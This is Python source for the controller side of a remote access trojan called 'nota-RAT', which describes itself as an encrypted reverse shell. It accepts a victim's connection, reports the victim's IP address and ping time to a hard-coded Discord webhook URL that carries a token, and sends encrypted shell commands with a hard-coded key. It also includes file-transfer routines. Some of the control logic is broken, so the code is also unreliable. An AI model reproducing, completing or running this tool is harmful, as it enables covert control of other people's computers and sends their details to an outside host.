import socket
import argparse
import os
import datetime
from pythonping import ping
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=423, help="Port of the Server", type=int
)


args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


print("""
              _          _____         _______ 
             | |        |  __ \     /\|__   __|
  _ __   ___ | |_ __ _  | |__) |   /  \  | |   
 | '_ \ / _ \| __/ _` | |  _  /   / /\ \ | |   
 | | | | (_) | || (_| | | | \ \  / ____ \| |   
 |_| |_|\___/ \__\__,_| |_|  \_\/_/    \_\_|                                                
       nota RAT v 1.0 | fluffydolphin                             
""")


s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
#webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1036935355934453790/32ktylVPdphVHLh3WH-73VQrZqKtkPf-pf-7sDv-YnBWRF2D9CpMoHkIiItES-jm4J91", content=f'@everyone \n {client_address[0]} connected')
#webhook.execute()
response_list = ping(f'{client_address[0]}', size=40, count=10)
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1036935355934453790/32ktylVPdphVHLh3WH-73VQrZqKtkPf-pf-7sDv-YnBWRF2D9CpMoHkIiItES-jm4J91')
embed = DiscordEmbed(title='nota-RAT', description='an encrypted reverse shell', color='03b2f8')
embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
embed.add_embed_field(name='Connection', value=f'@everyone \n {client_address[0]} connected')
embed.add_embed_field(name='Ping', value=f'{response_list.rtt_avg_ms}')
embed.set_timestamp()
webhook.add_embed(embed)
webhook.execute()


cwd = client_socket.recv(BUFFER_SIZE)
cwd = Fernet(key).decrypt(cwd).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    command = Fernet(key).encrypt(command.encode())
    client_socket.send(command)
    if KeyboardInterrupt:
        client_socket.close()
        s.close()
        break
    if command == "exit":
        break
    if command == "/getfile":
        filename = input("Please enter the filename: ")
        filename = Fernet(key).encrypt(filename.encode())
        client_socket.send(filename.encode())
        remaining = int.from_bytes(client_socket.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if command == "/sendfile":
        filename = input("Please enter the filename: ")
        client_socket.send(bytes(filename, "utf-8"))
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                client_socket.send(dataLen.to_bytes(4,'big'))
                client_socket.send(data)
            f.close()
    output = client_socket.recv(BUFFER_SIZE)
    output = Fernet(key).decrypt(output).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)
client_socket.close()
s.close()